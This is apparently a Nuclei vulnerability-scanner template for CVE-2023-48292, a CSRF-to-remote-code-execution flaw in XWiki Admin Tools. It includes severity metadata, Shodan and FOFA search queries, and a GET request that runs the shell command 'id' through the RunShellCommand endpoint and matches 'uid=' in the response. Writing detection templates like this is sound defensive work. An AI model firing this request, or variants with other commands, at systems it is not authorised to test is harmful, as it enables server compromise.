id: CVE-2023-48292

info:
  name: "XWiki Admin Tools - CSRF to RCE"
  author: Mehran Seifalinia
  severity: critical
  description: |
    XWiki Admin Tools versions prior to 4.5.1 contain a CSRF vulnerability that allows an attacker 
    to trick an administrator into executing arbitrary shell commands on the server. 
    This can lead to full system compromise.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-48292
    - https://github.com/xwiki-contrib/application-admintools/security/advisories/GHSA-8jpr-ff92-hpf9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 9.0
    cve-id: CVE-2023-48292
    cwe-id: CWE-352
    epss-score: 0.01823
    epss-percentile: 0.92137
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: XWiki
    product: XWiki Admin Tools
    fofa-query: title="XWiki"
    shodan-query:
      - http.title:"XWiki"
      - http.component:"XWiki"
  tags:
    - cve
    - cve2023
    - xwiki
    - csrf
    - rce
    - exploit
    - remote-code-execution
    - vulnerability

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/bin/view/Admin/RunShellCommand?command=id"
    headers:
      Referer: "{{BaseURL}}/xwiki/bin/view/Main/"
      Origin: "{{BaseURL}}"
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'uid=')"
          - "contains(body, '(xwiki)')"
          - "status_code == 200"
        condition: and
    extractors:
      - type: regex
        regex:
          - "uid=[0-9]+\\(xwiki\\)"
